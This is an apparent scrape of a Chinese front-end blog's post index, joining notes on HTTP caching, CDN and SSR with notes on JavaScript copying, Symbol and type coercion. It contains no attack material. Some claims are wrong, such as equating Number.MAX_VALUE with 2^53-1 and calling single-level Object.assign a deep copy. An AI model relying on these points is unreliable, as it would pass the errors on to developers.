当我们刷新淘宝网页的时候，查看Network选项，可以从请求文件的size栏发现大量的文件都是从Service Worker缓存中请求回来的： 这样的话就可以利用Service Worker的缓存进行网站的性能优化。 以下列淘宝请求同一js文件为例，从Service Worker中加载使用了7ms： 使用Ctrl + F5强制刷新后，向服务器请求同一文件花了100ms： 这就是使用Service Worker性能上带来的优势。由于是从本地缓存中读取的资源，所以资源读取的速度和整体的性能都会有一个明显的提升。 八、HTTP通用缓存策略1.缓存的简介 缓存定义： 浏览器在本地磁盘上将用户之前请求的数据存储起来，当访问者再次需要改数据的时候无需再次发送请求，直接从浏览器本地获取数据 缓存的好处： 减少请求的个数； 节省带宽，避免浪费不必要的网络资源； 减轻服务器压力； 提高浏览器网页的加载速度，提高用户体验； 2.缓存相关的header字段可以通过Chrome浏览器调试工具中的Network选项查看浏览器请求资源的情况： 注意不要勾选图中方框内的选项，否则有些请求会被过滤； Cache-Control字段服务器可通过httpheader中的Cache-Control字段控制客户端与服务器端之间的缓存策略，它的属性值有： max-age该字段指定了缓存的最大有效时间，以下为淘宝的一张图片： 在max-age属性指定的时间未到期前，客户端不会向服务器发起请求，而是从缓存中直接读取该图片。上图中可以看到浏览器直接从ServiceWorker的缓存中读取了该图片资源。 Expires字段同样可以指定缓存的有效期，不过这是HTTP1.0中的字段，优先级比HTTP1.1中的Cache-Control字段的max-age属性低； s-maxage缓存设备总体来说有两种：浏览器（客户端）和CDN服务器； 其中浏览器属于private类型缓存设备，表示只有浏览器才可以对资源进行缓存； CDN服务器属于public类型缓存设备，这种设备可以对源服务器上的资源进行缓存。并且，这种缓存对于任何用户来说都是可以访问的； s-maxage的优先级在Expires和max-age三者之中是最高的，用于指定public类型缓存设备（比如CDN）上资源的有效期。如下图所示，该资源设定了该字段后，浏览器既不会使用浏览器缓存，也不会向服务器请求资源，而是向public类型的缓存设备（如CDN服务器）请求资源： private服务器端可以通过该属性指定某一资源只能被浏览器（客户端）缓存，而不能被代理缓存服务器（CDN）缓存。 public服务器端可以通过该属性指定某一资源，既可以被浏览器缓存，也可以被代理缓存服务器缓存； no-cacheno-cache属性规定了浏览器要先向服务器端发送请求确认缓存资源的新鲜度，才能决定是否使用缓存；如下图所示： no-store该属性指定了浏览器无论缓存资源是否过期直接跳过缓存，重新向服务器请求资源。no-store属性用的比较少。 Expires字段这是http1.0的规范；它的值为一个绝对时间的GMT(格林威治标准时间)格式时间字符串，如Mon, 10 Jun 2015 21:31:12 GMT； 该字段指定了浏览器缓存资源的过期时间，在指定的时间到期前，浏览器可以直接从本地缓存中读取数据，而无需再次向服务器发起请求，属于强缓存；相比于max-age与s-maxage优先级最低，在这两个属性存在的情况下Expires字段会失效； 标识资源变化的字段Last-Modified/If-Modified-Since二者是基于客户端和服务端协商的缓存机制，标识资源最后更新时间的字段。last-modified字段位于response header中，If-Modified-Since字段位于request header中，二者配合着Cache-Control字段使用。 当服务器上的资源发生改变时会同步更新last-modified的字段值，当Expires字段或max-age属性指定的时间到期后，客户端会在请求头中携带If-Modified-Since字段，与服务器端资源的last-modified字段值进行比较： 情况一：如果二者相等说明资源自last-modified字段指定的时间以后都没有发生变化，此时服务器返回状态码304，属于协商缓存； 情况二：如果二者不相等说明资源发生了更新，服务器返回最新的资源和最新的last-modified字段值，此时的状态码为200； 举例 下图表示状态码为304的响应： 请求头中If-Modified-Since字段的值为Mon, 23 Mar 2020 18:14:15 GMT： 响应头中Last-Modified字段的值为Mon, 23 Mar 2020 18:14:15 GMT： 二者相等，说明资源没有发生变化，所以服务器返回状态码304，属于协商缓存，浏览器继续使用本地缓存； If-Modified-Since字段的值就是服务器端上一次响应资源中的Last-Modified字段值； Last-Modified的缺点 一些文件也许会周期性的更改，但是他的内容并不改变(仅仅改变的修改时间)，这个时候我们并不希望客户端认为这个文件被修改了，而重新GET； 某些文件修改非常频繁，比如在秒以下的时间内进行修改，(比方说1s内修改了N次)，If-Modified-Since能检查到的粒度是s级的，这种修改无法判断（比如淘宝每ms都会更新数据）； 某些服务器端不能获取精确的修改时间； 所以有了 Etag/If-None-MatchEtag字段是HTTP1.1中的标准，是一个唯一标识服务器端资源的hash值，该字段存在于响应头（reponse header）中；与请求头（request header）中的If-None-Match字段及Cache-Control字段配合使用。 只要服务器端的资源发生变化Etag值就会改变，相比于Last-Modified字段优先级更高且更有效；当Expires值或者Cache-Control字段中的max-age值到期时，客户端会在请求头中携带If-None-Match字段，该字段值为服务器端上一次响应资源中的Etag值，并与服务器端上最新资源的Etag值进行比较： 情况一：如果两个字段值相等，说明资源未发生改变，服务器端拒绝响应，返回状态码304，属于协商缓存； 情况二：如果两个字段值不相等说明服务器端上的资源发生了改变，服务器在响应中返回最新的资源和Etag值，此时状态码为200； 举例 下图表示状态码为304的响应： 请求头中If-None-Match字段值为2da25d4039...： 响应头中Etag字段值为2da25d4039...： 二者相等，说明资源没有发生变化，所以服务器返回状态码304，属于协商缓存，浏览器继续使用本地缓存； 总结： 利用Etag能够更加准确的控制缓存，因为Etag是服务器自动生成或者由开发者生成的对应资源在服务器端的唯一标识符； Last-Modified与ETag是可以一起使用的，由于Etag的优先度更高，所以服务器会优先比较Etag和If-None-Match。一致的情况下，才会继续比对Last-Modified和If-Modified-Since，最后才决定是否返回状态码304。 3.缓存策略缓存分类 强缓存： 不会向服务器发送请求，直接从本地缓存中获取数； 请求资源的的状态码为: 200 ok(from memory cache)； 协商缓存： 向服务器发送请求，服务器会根据请求头的资源判断是否命中协商缓存； 如果命中，则返回状态码304通知浏览器从缓存中读取资源； 强缓存与协商缓存的区别 分级缓存策略 最下层的200状态 这一层由Expires/Cache-Control字段控制： 当两者都存在时，Cache-Control会覆盖Expires，只要这些字段没有失效，浏览器都会直接使用本地缓存，属于强缓存； 1.Expires（HTTP1.0版本有效）是绝对时间； 2.Cache-Control（HTTP1.1版本有效）是相对时间； 缓存的来源大概有两种memory cache和disk cache： 可以看到，从memory cache中读取缓存不需要时间，从disk cache中读取缓存则需要一定时间。 相对时间与绝对时间与服务器的设置有关，当服务器设置Atime（最后访问时间）时，二者相等；当服务器设置Mtime（绝对修改时间）时，Expires从资源的创建开始计算过期时间，Max-age从请求发起的时间开始计算过期时间； 下图便是淘宝中采用强缓存的例子，状态码为200，图片资源都是从浏览器缓存memory cache中读取，所以请求时间为0ms： 中间的304状态 这一层由last-modified/Etag控制。当下一层失效时或用户点击refresh/F5时，浏览器就会向服务器发起请求，如果服务器上的相关资源没有更新，则返回状态码304，属于协商缓存； 下图便为协商缓存的情况，状态码为304。也可以这样理解：只要状态码是304都属于协商缓存： 最上层的200状态 当浏览器本身没有缓存或者下一层失效时，或者用户点击了Ctrl + F5强制刷新时，浏览器会直接向服务器请求最新的资源； 如下图所示： 用户行为对缓存的影响 缓存策略过程分析如图所示，该流程图表示服务器端在处理资源时采用缓存策略的过程： 首先服务器判断资源是否可以复用，不可复用则在Cache-Control字段中添加no-store属性； 可以复用的情况下，判断资源是否要求强一致？若是，则在Cache-Control字段中添加no-cache属性，这样不管缓存资源是否过期，都要求客户端或缓存代理服务器首先向服务器确认资源的新鲜度，属于协商缓存； 随后服务器指定是否允许Web代理缓存资源（比如CDN服务器缓存），如果允许则在Cache-Control字段中添加public属性，并指定代理缓存服务器上资源的有效期s-maxage；不允许则添加private属性，表示只能由客户端浏览器缓存资源，并设定缓存的有效期max-age； 随后，根据情况在客户端浏览器中，选择强缓存或者协商缓存； 九、服务端性能优化1.CDN服务器定义网站通常将其所有的服务器都放在同一个地方，当用户群增加时，公司就必须在多个地理位置不同的服务器上部署内容。为了缩短http请求的时间，我们应该把大量的静态资源放置的离用户近一点。 内容发布网络CDN（Content Delivery Networks）就是其中一种方式。CDN是一组分布在多个不同地理位置或网段的web服务器，用于更加有效的向用户发布内容。 基本思路 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定； 通过在网络各处放置节点服务器，在现有的互联网基础之上构成一层智能虚拟网络； CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。 基础架构最简单的CDN网络由一个DNS服务器和几台缓存服务器组成： 1、当用户点击网站页面上内容的URL时，经过本地DNS系统解析，DNS系统最终会将域名的解析权交给CNAME指向的CDN专用的DNS服务器； 关于DNS解析，不一定由DNS服务器响应，一般从缓存中读取。比如电脑缓存、浏览器缓存、路由器缓存、运行商缓存等。如果缓存中没有找到，才一级一级地查询：本地DNS-&gt; 权限DNS -&gt; 顶级DNS -&gt; 根DNS。全球只有13台根DNS服务器。 2、CDN的DNS服务器将CDN的全局负载均衡设备的IP地址返回给用户； 3、用户向CDN的全局负载均衡设备发起内容URL访问请求； 4、CDN全局负载均衡设备根据用户的IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求； 5、区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括： 基于以上这些条件的综合分析之后，CDN区域负载均衡设备会向CDN全局负载均衡设备返回一台CDN缓存服务器的IP地址。 根据用户IP地址，判断哪一台服务器距用户最近； 根据用户所请求的URL中携带的内容名称，判断哪一台服务器上有用户所需内容； 查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力； 6、CDN全局负载均衡设备把服务器的IP地址返回给用户； 7、用户向CDN缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端；如果这台CDN缓存服务器上并没有用户想要的内容，但是区域均衡设备依然将它分配给了用户，那么这台CDN服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地； 应用场景 网站站点/应用加速： 站点或者应用中大量静态资源的加速分发，建议将站点内容进行动静分离，动态文件可以结合云服务器ECS，静态资源如各类型图片、html、css、js文件等，使用CDN服务器存储，可以有效加速内容加载速度，轻松搞定网站图片、短视频等内容分发。 移动应用加速： 移动APP更新文件（apk文件）分发，移动APP内图片、页面、短视频、UGC等内容的优化加速分发。提供httpDNS服务，避免DNS劫持并获得实时精确的DNS解析结果，有效缩短用户访问时间，提升用户体验。 视音频点播/大文件下载分发加速； 视频直播加速； 总结简单点说CDN服务器相当于顺丰快递分布于全国各地的仓库，主仓库将快递运送到这些分仓库，用户可以就近取货，由此加快了速度。 除此之外CDN服务器还有许多高级功能，比如防止DDOS攻击等，这里就不展开了； 2.SSR(Server Side Rendering)依赖现代框架如Vue和React构建的网站，往往会存在一定的问题，比如Vue框架。 Vue渲染面临的问题 首屏渲染时，要先下载和解析app.js（打包过后的Vue.js）之后，才能开始渲染页面。 优化方案 构建层模板编译：将模板编译的任务放在了构建层中完成，而不是浏览器； 数据无关的Prerender的方式； 服务端渲染：即将浏览器端进行的运算的一部分转移到服务器端上； 通常采用服务端渲染（SSR）的方式进行优化。所谓SSR就是利用服务器端优秀的计算能力，将一部分的页面渲染任务交由服务器端进行处理。以下为服务端渲染SSR的流程图： 服务端渲染可以很好地优化首屏渲染的问题；可以根据业务需求，适当地分配客户端和服务器端的渲染部分，综合利用客户端和服务器端的计算能力，从而达到性能优化的目的。 本文作者：AhuntSun 本文链接：https://www.cnblogs.com/AhuntSun-blog/p/12641050.html","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"html","slug":"html","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/html/"}]},{"title":"深拷贝、浅拷贝","date":"2020-12-09T02:58:38.000Z","path":"2020/12/09/deep-copy-light-copy/","text":"前言 简单值（基本类型值）总是通过值复制的方式来赋值/传递 null,undefined,symbol,string,number,boolean 复杂值（对象和函数）总是通过引用复制的方式来赋值/传递 object, array, function 由于引用指向的值本身而非变量，因此一个引用无法更改另一个引用的指向 不能通过引用一个新的引用来更改旧的引用的指向，只能修改新旧引用共同指向的值 如果通过值复制的方式来传递复合值，就需要创建一个复本，这样传递的就不是原始值foo(a.slice())，foo中的操作不会影响到a指向的数组 因此会发现复杂值的赋值的时候，例如 a = obj，当我们改变a中某个属性的值时，这是obj里面对应属性的值也发生了变化，这种就是浅拷贝 如果a的属性的值发生改变，obj对应属性的值不发生变化，这种就是深拷贝 浅拷贝 浅拷贝拷贝的是引用地址，实现方式有以下几种 Object.assign(target, obj1, obj2...)将第二个参数及以后的参数合并到第一个对象里 – 前提传入的参数都是多层嵌套，单层的话是深拷贝 for...in...遍历每一个属性，将他们复制给新的对象，对象必须是多层的状态下才能实现浅拷贝 – 前提传入的参数都是多层嵌套，单层的话是深拷贝 $.extend(boolean?, &#123;&#125;, obj1, obj2...) jquery的对象扩展方法,boolean如果为true是深拷贝，不填就是浅拷贝，将第三个参数及以后的参数合并到第二个对象里 – 前提传入的参数都是多层嵌套，单层的话是深拷贝 es6新方法 扩展运算符 ... – 前提传入的参数都是多层嵌套，单层的话是深拷贝 Array.prototype.concat(),Array.prototype.slice()slice和concat方法不会修改原数组，只会返回一个浅复制了原数组中的一个新数组 对象会发生变化，String,Number,boolean不会发生变化 深拷贝深拷贝拷贝的是对象的数据而不是地址 JSON.stringify(),JSON.parse(),这个方法对于对象中包含函数不使用，因为不会拷贝函数 es6新方法 扩展运算符 ... – 前提传入的参数都是多层嵌套，单层的话是深拷贝 loadsh 手动进行递归赋值","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"}]},{"title":"Symbol详解","date":"2020-12-04T07:23:00.000Z","path":"2020/12/04/Symbol详解/","text":"定义Symbol 12var sym = Symbol()var sym1 = Symbol(&#x27;foo&#x27;) Symbol(&#39;foo&#39;)并不会强制将字符串foo转化成symbol类型，他每次都会创建一个新的symbol类型 因此Symbol(&#39;foo&#39;) !== Symbol(&#39;foo&#39;) 如果想要创建一个Symbol包装器对象，可以使用Object()函数 1234var sym = Symbol(&#x27;foo&#x27;)typeof sym // &#x27;symbolvar symObj = Object(sym)typeof symObj // &#x27;object&#x27; 全局共享的Symbol 可以使用Symbol.for()或Symbol.keyFor()方法从全局的symbol注册表设置和取得symbol 在对象中查找symbol属性 Object.getOwnPropertySymbols()查找一个给定对象的符号属性时返回一个symbol类型的数组，数组可能为空 属性 Symbol.iterator 为每一个对象定义了默认的迭代器，可以被for...of循环使用 12345678910111213141516171819202122232425当需要对一个对象进行迭代时，它的`@@iterator`方法都会在不传参情况下被调用，返回的迭代器用于获取要迭代的值一些内置类型拥有默认的迭代器行为* `Array.prtotype[@@iterator]()`* `TypedArray.prtotype[@@iterator]()`* `String.prtotype[@@iterator]()`* `Map.prtotype[@@iterator]()`* `Set.prtotype[@@iterator]()`**自定义迭代器**~~~js var myIterable = &#123;&#125; myIterable[Symbol.iterator] = function* () &#123; yield 1; yield 2; yield 3; &#125; [...myIterable] // [1,2,3] for (var x of myIterable) &#123; console.log(x) / 1 -&gt; 2 -&gt; 3 &#125;~~~如果一个迭代器没有返回一个迭代器对象，那么他是一个不合格的迭代器，在运行时将会抛出异常 Symbol.asyncIterator 是一个用于访问对象的@@asyncIteratir方法的内建符号，一个异步可迭代对象必须要有Symbol.asyncIterator 12345678910111213141516const myAsyncIterable = new Object();myAsyncIterable[Symbol.asyncIterator] = async function*() &#123; yield &quot;hello&quot;; yield &quot;async&quot;; yield &quot;iteration!&quot;;&#125;;(async () =&gt; &#123; for await (const x of myAsyncIterable) &#123; console.log(x); // expected output: // &quot;hello&quot; // &quot;async&quot; // &quot;iteration!&quot; &#125;&#125;)(); Symbol.match指定了匹配的是正则表达式而不是字符串，String.prototype.match()方法会调用此函数 1234const regexp = /foo/regexp[Symbol.match] = falseconsole.log(&#x27;foo&#x27;.startWith(regexp)) // trueconsole.log(&#x27;baz&#x27;.startWith(regexp)) // false Symbol.replace这个属性指定了当一个字符串替换所匹配字符串时调用的方法，String.prototype.replace()会调用此方法 123456789class Replace &#123; constructor(value) &#123; this.value = value &#125; [Symbol.replace](string) &#123; return `s/$&#123;string&#125;/$&#123;this.value&#125;/g` &#125;&#125;console.log(&#x27;foo&#x27;.replace(new Replace(&#x27;bar&#x27;))) // s/foo/bar/g Symbol.search指定了一个搜索方法，这个方法接受用户输入的正则表达式，返回改正则表达式在字符串中匹配到的下标 String.prototype.search()会调用此方法 123456789class caseInsensitiveSearch &#123; constructor(value) &#123; this.value = value.toLowerCase() &#125; [Symbol.search](string) &#123; return string.toLowerCase().indexOf(this.value) &#125;&#125;console.log(&#x27;foobar&#x27;.search(new caseInsensitiveSearch(&#x27;BaR&#x27;))); // 3 Symbol.split指向一个正则表达式的索引处分割字符串的方法，这个方法通过String.prototype.split()调用 123456789/a/[Symbol.split](&#x27;aba&#x27;, 3)var exp = &#123; pat: &#x27;in&#x27; [Symbol.split](str) &#123; return str.split(this.pat) &#125;&#125;&#x27;dayinlove&#x27;.split(exp) Symbol.hasInstance 可以判断某对象是否为某构造器的实例，应此你们可以用它自定义instanceof操作符在某个类上的行为 1234567class Array1 &#123; static [Symbol.hasInstance](instance) &#123; return Array.isArray(instance) &#125;&#125;console.log([] instanceof Array1) // true Symbol.isConcatSpreadable符号用于配置某对象作为Array.prototype.concat()方法的参数时是否展开数据元素 1234567const a = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]const b = [1, 2, 3]let ab = a.concat(b) // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, 1, 2, 3]b[Symbol.isConcatSpreadable] = falseab = a.concat(b) // [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, Array[1, 2, 3]] Symbol.toStringTag作为对象的属性键使用，对用的属性值应该为字符串类型，内置的Object.prototype.toString()方法会读取这个标签并把它包含在自己的返回值里面 加上toStringTag属性，你的类也可以自定义类型标签 123456class myClass &#123; get [Symbol.toStringTag]() &#123; return &#x27;myClass&#x27; &#125;&#125;console.log(Object.prototype.toString.call(new myClass())) // &#x27;[object myClass]&#x27; Symbol.for()方法会根据给定的键key，来从运行时的symbol注册表中找到对应的symbol，如果找到了就返回，没有找到就新建一个symbol并加入到全局symbol的注册表中 12345678Symbol.for(&#x27;foo&#x27;) // 全局注册 fooSymbol.for(&#x27;foo&#x27;) // 返回上一个全局注册的fooSymbol.for(&#x27;foo&#x27;) === Symbol.for(&#x27;foo&#x27;) // trueSymbol(&#x27;foo&#x27;) === Symbol(&#x27;foo&#x27;) // falsevar sym = Symbol.for(&#x27;mario&#x27;)sym.toSstring() // &#x27;Symbol(mario)&#x27; Symbol.keyFor() 用来获取全局symbol注册表中与某个symbol关联的键 123456789// 创建一个全局 Symbol var globalSym = Symbol.for(&quot;foo&quot;); Symbol.keyFor(globalSym); // &quot;foo&quot;var localSym = Symbol(); Symbol.keyFor(localSym); // undefined，// 以下Symbol不是保存在全局Symbol注册表中Symbol.keyFor(Symbol.iterator) // undefined","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/JavaScript/"},{"name":"symbol","slug":"symbol","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/symbol/"},{"name":"es6","slug":"es6","permalink":"https://lxxstar987.gitee.io/lxx1997.github.io/tags/es6/"}]},{"title":"你不知道的javascript中卷 知识点摘录","date":"2020-12-03T06:41:36.000Z","path":"2020/12/03/你不知道的javascript中卷/","text":"第一章 类型和语法 内置类型 空值 null typeof null === &#39;object&#39; 未定义 undefined typeof undefined === &#39;undefined&#39; 布尔值 boolean typeof true === &#39;boolean&#39; 数字 number typeof 42 === &#39;number&#39; 字符串 string typeof &#39;42&#39; === &#39;string&#39; 对象 object typeof &#123;life: 42&#125; === &#39;object&#39; 符号 symbol typeof Symbol() === &#39;symbol&#39; typeof function() &#123;/* .. */&#125; === &#39;function&#39; typeof [1,2,3] === &#39;object&#39; 数组是object的一个子类型 对变量执行typeof操作时，得到的结果并不是该变量的类型，而是该变量持有的值的类型，因为javascript中的变量没有类型 undefined 和 undeclared 已在作用域中声明但还没有赋值的变量是undefined，还没有在作用域声明过的变量是undeclared 数组 delete运算符可以将单元从数组中删除，但是数据的length属性并不会发生变化 如果字符串键值能够被强制类型转换为十进制数字的话，他就会被当做数字索引来处理 123var a = []a[&#x27;13&#x27;] = 43a.length // 14 类数组 - 有时候需要将类数组转换为真正的数组 通过for循环遍历类数组，将类数组的每一个元素复制到新的数组里 slice 返回的是类数组的一个数组复本Array.prototype.slice.call(arguments) concatArray.prototype.concat.apply([], arguments) spliceArray.prototype.splice.call(arguments, 0) Array.form() 字符串 字符串和数据的确很相似，都是类数组，都有length属性，以及indexOf和concat方法，但是字符串是不可变的，数组是可变的 字符串可以借用数组的非变更方法来处理字符串Array.prototype.join.call(a, &#39;-),Array.prototype.map.call(a, function() &#123;/* .. */&#125;) 字符串反转 可以先将字符串转成数组反转后再转成字符串string.split(&#39;&#39;).reverse().join(&#39;&#39;) 包含复杂的字符，可以使用工具库 数字 数字常亮一般用十进制表示，数字前面的0可以省略，小数部分最后面的0也可以省略 指数模式 5E10 === 50000000000 === 50000000000.toExponential() //5e+10 .toFixed() 指定小数部分的显示位数 输出结果实际上是给定数字的字符串形式，如果指定的小数部分显示位数多余实际位数就用0补齐 .toPrecision() 用来指定有效位数的显示位数 对于.运算符，因为它是一个有效的数字字符，会被优先识别为数字常量的一部分，然后才是对象属性访问运算符1234542.toFixed(3) // SyntaxError(42).toFixed(3) // &#x27;42.000&#x27;0.42.toFixed(3) // &#x27;0.420&#x27;42..toFixed(3) // &#x27;42.000&#x27;42 .toFixed(3) // &#x27;42.000&#x27; 数字常量的格式123450xf3 // 243的16进制0363 // 243的八进制// es60o363 // 243的八进制0b11110011 // 243的二进制 极小数运算 为了保证精准，可以设置一个误差范围值（机械精度）Number.EPSILON1234567891011// 如果没有Number.EPSILON，自己定义Number.EPSILON，如果有直接拿来使用if(!Number.EPSILON) &#123; Number.EPSILON = Math.pow(2, -52)&#125;function numbersCloseEnoughToEqual(n1, n2) &#123; return Math.abs(n1 - n2) &lt; Number.EPSILON&#125;var a = 0.1 + 0.2var b = 0.3numbersCloseEnoughToEqual(a, b) // true Number.MAX_VALUE 为 Math.pow(2, 53) - 1 即 2^53-1 在es6中被定义为Number.MAX_SAFE_INTEGER 最小整数是 -Math.pow(2, 53) + 1 在es6中被定义为Number.MIN_SAFE_INTEGER 整数检测 Number.isInteger(..) 检查一个值是否是安全的整数 Number.isSafeInteger(..) a | 0可以将变量a中的数值转化为32位有符号整数，因为数位运算符|只适用32位整数，因此与0进行操作即可截取a中的32位数位 特殊数值 不是值的值undefined类型只有一个值 undefined, null类型也只有一个值，即nullnull指空值，不能作为标识符，不能将其作为变量来使用和赋值, undefined指没有值，是一个标识符，可以被当做变量使用和赋值 undefined是一个内置标识符，他的值为undefined，通过void运算符即可得到该值 12var a = 42console.log(void a, a) // undefined 42 特殊的数字 NaN 它与自身不相等，需要用isNaN or Number.isNaN方法来判断是否是NaN 无穷数 可以从有穷到无穷，但是无法从无穷到有穷 ±Infinity 零值 加法和减法无法的到0值 JSON.stringify(-0) =&gt; &#39;0&#39; JSON.parse(&#39;-0&#39;) =&gt; &#39;0&#39; 特殊等式 Object.is() 主要用来处理特殊的相等比较 ==和===的效率更高，更为通用 值和引用 简单值（基本类型值）总是通过值复制的方式来赋值/传递 null,undefined,symbol,string,number,boolean 复杂值（对象和函数）总是通过引用复制的方式来赋值/传递 object, array, function由于引用指向的值本身而非变量，因此一个引用无法更改另一个引用的指向不能通过引用一个新的引用来更改旧的引用的指向，只能修改新旧引用共同指向的值如果通过值复制的方式来传递复合值，就需要创建一个复本，这样传递的就不是原始值foo(a.slice())，foo中的操作不会影响到a指向的数组 原生函数 String() Number() Boolean() 通过Boolean创建的真值并不是真正意义的真值 ，它总是true Array() Object() Function() RegExp() Date() Error() Symbol() 原生函数可以被当做构造函数来使用 1234var a = new String(&#x27;hello world&#x27;)typeof a // objecta instanceof String // trueObject.prototype.toString.call(a) // &#x27;[object String]&#x27; 内部属性[[Class]]typeof 返回值为object的对象都包含有一个内部属性[[Class]],这个属性无法直接访问，可以通过Object.prototype.toString.call(..)来查看 Null的内部属性为[object Null] Undefined的内部属性为[object Undefined] 封装对象包装如果想要自行封装基本类型值，可以使用Object(..)函数，一般不推介使用封装对象部分封装对象封装基本类型时获取到的值并非我们想要的值(Boolean) 拆封想要得到封装对象中的基本类型值，可以使用valueOf()函数在使用的时候回发生隐式拆分 原生函数 Array(..)Array构造函数只带一个数字参数时，会被作为数组的预设长度 对于一个有长度的空数组，无法使用map(..)但是可以使用join(..),因为join(..)首先嘉定数组不为空，然后通过length属性来遍历其中的元素 1234Array.apply( null, &#123; length: 3 &#125; ) // 等价于Array(undefined, undefined, undefined)// apply的第二个参数可以是数组或者类数组 永远不要创建和使用空单元数组 Object(..)、Function(..)、RegExp(..) 同理，尽量不要使用动态定义正则表达式可以使用new RegExp(pattern, flags)来定义 Date(..) 和 Error(..)创建日期对象使用new Date(), Date(..)可以带参数，用来指定日期和时间Date.now()自动获取当前时间戳 Error(..)主要是为了获得当前运行栈的上下文，与throw一起使用 Symbol(..)符号具有唯一性的特殊值符号可以用作属性名，但无论是在代码还是开发控制台中都无法查看和访问它的值，只会 显示为诸如 Symbol(Symbol.create) 这样的值 原生原型 原生函数都有自己的prototype对象，包含其对应子类型所特有的行为特征所有的函数都可以调用Function.prototype的apply(..), call(..), bind(..) Function.prototype 是一个函数 RegExp.prototype 是一个正则表达式 Array.prototype 是一个数组 强制类型转换 值类型转换 - 类型转换发生在静态类型语言的编译阶段，强制类型转换发生在动态类型语言的运行时(runtime)，又可以区分为”隐式强制类型转换”和”显示强制类型转换” 抽象值操作 toString() - 负责处理非字符串到字符串的强制类型转换 JSON.stringify() undefined,function, symbol,循环引用的对象都不能用JSON.stringify进行处理，会被自动忽略，在数组中则会返回null如果需要对含有非法JSON值的对象作字符串化，或者对象中的某些值无法被序列化时，需要定义toJSON()方法返回一个安全的JSON值 toJSON返回的是一个能够被字符串化的安全的JSON值，然后再由JSON.stringify对其进行字符串化 我们可以向JSON.stringify()传递一个可选参数replacer, 可以是数组或者函数，用来指定对象序列化过程中哪些属性应该被处理，哪些被排除 12345678910var a = &#123; b: 42, c: &#x27;42&#x27;. d: [1,2,3]&#125;// replacer为数组的话，必须是一个字符串数组JSON.stringify(a, [&#x27;b&#x27;, &#x27;c&#x27;]) // &quot;&#123;&quot;b&quot;:42,&quot;c&quot;:&quot;42&quot;&#125;&quot; JSON.stringify(a, function(k,v) &#123; if(k!==&quot;c&quot;) return v&#125;) // &quot;&#123;&quot;b&quot;:42,&quot;d&quot;:[1,2,3]&#125;&quot; JSON.stringify 还有一个可选参数space用来指定输出的缩进格式。space 为正整数时是指定 每一级缩进的字符数，它还可以是字符串 12345678var a = &#123; b: 42, c: &quot;42&quot;, d: [1,2,3]&#125;; JSON.stringify( a, null, 3 ); // &quot;&#123; &quot;b&quot;: 42, &quot;c&quot;: &quot;42&quot;, &quot;d&quot;: [ 1, 2, 3 ] &#125;&quot; JSON.stringify( a, null, &quot;-----&quot; ); // &quot;&#123; // -----&quot;b&quot;: 42, // -----&quot;c&quot;: &quot;42&quot;, // -----&quot;d&quot;: [ // ----------1, // ----------2, // ----------3 // -----] // &#125;&quot; toNumber() true转换为1，false转化为0，undefined转化为NaN，null转化为0 在进行转化时，抽象操作ToPrimitive会首先检查该值是否有valueOf方法，如果有并且返回基本类型值，就使用该值进行强制类型转换，如果没有就使用toString的返回值来强制类型转换，如果都不返回基本值，就会报TypeError toBoolean 假值包含 undefined，null，false，+0，-0，NaN, “” 会被转换为false 显示强制类型转换 String(), Number() a.toString() 一元运算符+ 日期显示转化为数字 new Date() or +new Date() new Date().getTime() Date.now() 奇特的~运算符 返回2的补码 ~x ≈ -(x+1)~a.indexOf(b)强制转化为真假值 字位截除 ~~ or x | 0 只适用于32位数字 显示解析数字字符串 Number() 不允许出现非数字字符 parseInt() 允许出现非数字字符 第二个参数表示进制类型 parseFloat() Boolean() !! 隐式强制类型转换 字符串和数字之间的隐式强制类型转换如果 + 的其中一个操作数是字符串，则执行字符串拼接，否则执行数字加法“[]+{} {} + []” =&gt; [object Object] 0第一个表达式{} 被当做空对象来对待 第二个表达式{}被当做代码块来看待隐式转换如果有valueOf方法则是会先调用valueOf方法然后通过ToString抽象操作将返回值转为字符串 String直接调用ToString() 123456var a = &#123; valueOf: function() &#123; return 42&#125;, toString: function() &#123; return 4 &#125;&#125;a + &#x27;&#x27; // &#x27;42&#x27;String(a) // &#x27;4&#x27; 会将字符串转化为数字 布尔值到数字的隐式强制类型转换 隐式强制转换成布尔值 || &amp;&amp; - 选择器运算符， 他们的返回值是两个操作数中的一个然后返回他的值 符号的强制类型转换符号不能被强制类型转换为数字，但可以被强制类型转为布尔值 宽松相等 == 严格相等 === 12345var x = 1 || &#x27;1&#x27;var y = truex == y // truenull == undefined // true 对象和非对象之间的比较，对象会先toString然后才与非对象进行比较 满足a == 2 &amp;&amp; a == 3为true 12345678var i = 2Number.prototype.valueOf = function() &#123; return i++&#125;var a = new Number(42)console.log(a + &#x27;&#x27;) // 2console.log(a + &#x27;&#x27;) // 3 123456789101112131415161718192021222324252627&quot;0&quot; == null; // false &quot;0&quot; == undefined; // false &quot;0&quot; == false; // true -- 晕！ &quot;0&quot; == NaN; // false &quot;0&quot; == 0; // true &quot;0&quot; == &quot;&quot;; // false false == null; // false false == undefined; // false false == NaN; // false false == 0; // true -- 晕！ false == &quot;&quot;; // true -- 晕！ false == []; // true -- 晕！ false == &#123;&#125;; // false &quot;&quot; == null; // false &quot;&quot; == undefined; // false &quot;&quot; == NaN; // false &quot;&quot; == 0; // true -- 晕！ &quot;&quot; == []; // true -- 晕！ &quot;&quot; == &#123;&#125;; // false 0 == null; // false 0 == undefined; // false 0 